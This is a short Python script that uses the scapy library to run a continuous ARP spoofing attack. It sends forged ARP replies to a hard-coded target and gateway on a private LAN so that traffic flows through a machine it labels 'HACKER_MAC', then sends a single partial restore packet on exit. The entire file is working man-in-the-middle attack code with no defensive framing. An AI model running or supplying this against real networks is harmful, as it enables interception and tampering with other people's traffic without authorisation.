import scapy.all as scapy
import time

INTERFACE = "ens33"
TARGET_IP = "192.168.1.23"
TARGET_MAC = "00:0c:29:31:8d:ab"
GATEWAY_IP = "192.168.1.254"
GATEWAY_MAC = "10:50:72:21:69:28"
HACKER_MAC = "00:0c:29:0c:00:da"

try:
    packet_count = 0
    while True:
        packet_target = scapy.ARP(op=2, pdst=TARGET_IP, hwdst=TARGET_MAC, psrc=GATEWAY_IP, hwsrc=HACKER_MAC)
        packet_gateway = scapy.ARP(op=2, pdst=GATEWAY_IP, hwdst=GATEWAY_MAC, psrc=TARGET_IP, hwsrc=HACKER_MAC)

        scapy.send(packet_target, iface=INTERFACE, verbose=False)
        packet_count += 1
        print(str(packet_count) + ' Send packet for target: ' + TARGET_IP, TARGET_MAC + ' from: ' + GATEWAY_IP, HACKER_MAC)
        scapy.send(packet_gateway, iface=INTERFACE, verbose=False)
        packet_count += 1
        print(str(packet_count) + ' Send packet for gateway: ' + GATEWAY_IP, GATEWAY_MAC + ' from: ' + TARGET_IP, HACKER_MAC)

        time.sleep(2)

except KeyboardInterrupt:
    print("\nStopping ARP spoofing. Restoring network...")
finally:
    packet_restore = scapy.ARP(op=2, pdst=TARGET_IP, hwdst=TARGET_MAC, psrc=GATEWAY_IP, hwsrc=GATEWAY_MAC)
    scapy.send(packet_restore, iface=INTERFACE, verbose=False)
    print("Total packets sent: ", packet_count + 1)

